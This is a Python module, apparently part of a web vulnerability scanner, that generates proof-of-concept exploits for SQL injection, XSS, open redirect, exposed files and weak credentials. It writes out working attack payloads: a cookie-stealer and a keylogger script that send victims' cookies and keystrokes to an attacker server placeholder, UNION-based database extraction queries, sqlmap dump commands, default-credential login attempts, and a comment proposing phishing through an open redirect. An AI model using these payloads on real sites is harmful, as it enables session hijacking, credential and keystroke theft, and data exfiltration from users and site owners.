# modules/poc_generator.py
# Generates Proof-of-Concept exploits for found vulnerabilities

from urllib.parse import urlparse, urlencode, parse_qs


def generate_curl(vuln_type, url, parameter=None, payload=None):
    """Generate curl command for the vulnerability"""

    if "SQL Injection" in vuln_type or "Login Bypass" in vuln_type:
        return f'curl -v -g "{url}"'

    elif "XSS" in vuln_type:
        # ✅ FIXED: Removed invalid `document.cookie` JS syntax from HTTP header
        return f'curl -v -g "{url}" -H "Cookie: session=<your_session_cookie_here>"'

    elif "Open Redirect" in vuln_type:
        return f'curl -v -L "{url}" -H "User-Agent: Mozilla/5.0"'

    elif "Sensitive File" in vuln_type or "Directory" in vuln_type:
        return f'curl -v "{url}"'

    elif "Missing Header" in vuln_type:
        return f'curl -I "{url}"'

    elif "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        return f'curl -v -X POST "{url}" -d "username={username}&password={password}"'

    else:
        return f'curl -v "{url}"'


def generate_python_exploit(vuln_type, url, parameter=None, payload=None):
    """Generate Python exploit script"""

    base = f'''import requests

url = "{url}"
session = requests.Session()
session.headers.update({{
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}})
'''

    if "SQL Injection" in vuln_type:
        return base + f'''
# SQL Injection Exploit
payload = "{payload}"

response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")

# Check for SQL errors
sql_errors = ["sql syntax", "mysql", "syntax error", "ora-"]
for error in sql_errors:
    if error in response.text.lower():
        print(f"[!!!] SQL Error found: {{error}}")
        break

# Try UNION based extraction
union_url = url + "' UNION SELECT null,@@version,null-- -"
r = session.get(union_url)
print(f"\\n[UNION] Status: {{r.status_code}}")
print(f"[UNION] Response: {{r.text[:500]}}")
'''

    elif "XSS" in vuln_type:
        return base + f'''
# XSS Exploit — Cookie Stealer
steal_payload = "<script>fetch('http://YOUR_SERVER/?c='+document.cookie)</script>"

response = session.get(url)
print(f"Status: {{response.status_code}}")

# Check if payload reflects
if "{payload}" in response.text:
    print("[!!!] XSS payload reflected in response!")
    print(f"[!!!] Try cookie stealer: {{steal_payload}}")
else:
    print("[-] Payload not directly reflected, try encoded versions")
'''

    elif "Open Redirect" in vuln_type:
        return base + f'''
# Open Redirect Exploit
test_url = "{url}"

response = session.get(test_url, allow_redirects=True)
print(f"Final URL: {{response.url}}")
print(f"Status: {{response.status_code}}")

if "evil.com" in response.url:
    print("[!!!] Open Redirect confirmed!")
    print("[!!!] Use for phishing: send victim to cloned login page")
else:
    print(f"[-] Final destination: {{response.url}}")
'''

    elif "Sensitive File" in vuln_type:
        return base + f'''
# Sensitive File Exposure Exploit
response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Content-Type: {{response.headers.get('Content-Type', 'unknown')}}")
print(f"Response length: {{len(response.text)}} bytes")
print("\\n--- FILE CONTENTS (first 1000 chars) ---")
print(response.text[:1000])

# Check for sensitive data
sensitive = ["password", "secret", "api_key", "token", "db_password"]
for s in sensitive:
    if s in response.text.lower():
        print(f"\\n[!!!] Sensitive keyword found: {{s}}")
'''

    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        return base + f'''
# Login Bypass / Weak Credentials Exploit
login_url = "{url}"
username = "{username}"
password = "{password}"

data = {{
    "username": username,
    "password": password
}}

response = session.post(login_url, data=data)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")

success_indicators = ["dashboard", "welcome", "logout", "profile"]
for indicator in success_indicators:
    if indicator in response.text.lower():
        print(f"[!!!] LOGIN SUCCESS! Indicator found: {{indicator}}")
        print(f"[!!!] Credentials: {{username}}:{{password}}")
        break
'''

    elif "Missing Header" in vuln_type:
        return base + f'''
# Missing Security Header — Verification
response = session.get(url)
print(f"Status: {{response.status_code}}")
print("\\n--- Security Headers ---")

security_headers = [
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy"
]

for header in security_headers:
    value = response.headers.get(header, "MISSING")
    status = "✅" if value != "MISSING" else "❌"
    print(f"{{status}} {{header}}: {{value}}")
'''

    else:
        return base + f'''
# Generic Vulnerability Verification
response = session.get(url)
print(f"Status: {{response.status_code}}")
print(f"Response length: {{len(response.text)}}")
print("\\n--- Headers ---")
for k, v in response.headers.items():
    print(f"{{k}}: {{v}}")
'''


def generate_burp_request(vuln_type, url, parameter=None, payload=None):
    """Generate Burp Suite HTTP request"""

    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path
    query = parsed.query

    if "SQL Injection" in vuln_type or "XSS" in vuln_type or "Open Redirect" in vuln_type:
        return f'''GET {path}{"?" + query if query else ""} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

'''

    elif "Login Bypass" in vuln_type or "Weak Credentials" in vuln_type or "Default Credentials" in vuln_type:
        creds = payload.split(":") if payload and ":" in payload else ["admin", "admin"]
        username = creds[0]
        password = creds[1] if len(creds) > 1 else ""
        body = f"username={username}&password={password}"
        return f'''POST {path} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(body)}
Connection: close

{body}'''

    elif "Missing Header" in vuln_type:
        return f'''GET {path} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

# After sending — check Response headers for missing:
# Content-Security-Policy
# Strict-Transport-Security
# X-Frame-Options
'''

    else:
        return f'''GET {path}{"?" + query if query else ""} HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: */*
Connection: close

'''


def generate_poc(vuln_type, url, parameter=None, payload=None):
    """
    Master function — generates complete PoC for a vulnerability
    Returns dict with all PoC formats
    """
    return {
        "vuln_type": vuln_type,
        "url": url,
        "parameter": parameter,
        "payload": payload,
        "curl": generate_curl(vuln_type, url, parameter, payload),
        "python": generate_python_exploit(vuln_type, url, parameter, payload),
        "burp": generate_burp_request(vuln_type, url, parameter, payload),
    }


def format_poc_terminal(poc):
    """Format PoC for terminal output"""
    lines = []
    lines.append(f"\n{'='*60}")
    lines.append(f"💥 PROOF OF CONCEPT: {poc['vuln_type']}")
    lines.append(f"{'='*60}")
    lines.append(f"🌐 URL: {poc['url']}")
    if poc.get('payload'):
        lines.append(f"🔧 Payload: {poc['payload']}")

    lines.append(f"\n📌 curl Command:")
    lines.append(f"  {poc['curl']}")

    lines.append(f"\n🐍 Python Exploit:")
    lines.append("  " + poc['python'].replace('\n', '\n  '))

    lines.append(f"\n🔴 Burp Request:")
    lines.append("  " + poc['burp'].replace('\n', '\n  '))

    lines.append(f"{'='*60}\n")
    return "\n".join(lines)


def generate_advanced_exploit(vuln_type, url, payload=None):
    """Generate advanced multi-step exploit"""

    if "SQL Injection" in vuln_type:
        # ✅ FIXED: Extract replacement strings before f-string to avoid backslash syntax error
        union_payload = "' UNION SELECT @@version--"
        safe_payload = payload or ""
        replaced_url = url.replace(safe_payload, union_payload)

        return {
            "title": "SQL Injection - Database Extraction",
            "steps": [
                {
                    "name": "Step 1 - Confirm SQLi",
                    "curl": f'curl -v -g "{url}"',
                    "python": f'''import requests
r = requests.get("{url}")
print("Vulnerable!" if any(e in r.text.lower() for e in ["sql","mysql","syntax"]) else "Testing...")'''
                },
                {
                    "name": "Step 2 - Extract DB Version",
                    "curl": f'curl -v -g "{replaced_url}"',
                    "python": f'''import requests
r = requests.get("{url}", params={{"id": "' UNION SELECT @@version--"}})
print(r.text[:500])'''
                },
                {
                    "name": "Step 3 - List Databases",
                    "curl": f'curl -v -g "{url}"',
                    "python": f'''import requests
r = requests.get("{url}", params={{"id": "' UNION SELECT schema_name FROM information_schema.schemata--"}})
print(r.text[:500])'''
                },
                {
                    "name": "Step 4 - Dump with SQLMap",
                    "curl": f'sqlmap -u "{url}" --dbs --batch',
                    "python": f'# Run: sqlmap -u "{url}" --dump --batch'
                }
            ]
        }

    elif "XSS" in vuln_type:
        return {
            "title": "XSS - Session Hijacking",
            "steps": [
                {
                    "name": "Step 1 - Confirm XSS",
                    "curl": f'curl -v -g "{url}"',
                    "python": f'''import requests
r = requests.get("{url}")
print("XSS confirmed!" if "<script>" in r.text.lower() else "Testing...")'''
                },
                {
                    "name": "Step 2 - Cookie Stealer",
                    "curl": "# Host a server first: python3 -m http.server 8080",
                    "python": f'''# Payload to steal cookies:
payload = "<script>fetch('http://YOUR_IP:8080/?c='+document.cookie)</script>"
# Inject into: {url}'''
                },
                {
                    "name": "Step 3 - Keylogger",
                    "curl": "# Advanced: inject keylogger",
                    "python": '''payload = """<script>
document.onkeypress = function(e) {{
    fetch('http://YOUR_IP:8080/?k='+e.key);
}}
</script>"""
print("Inject this payload into the XSS point")'''
                }
            ]
        }

    return None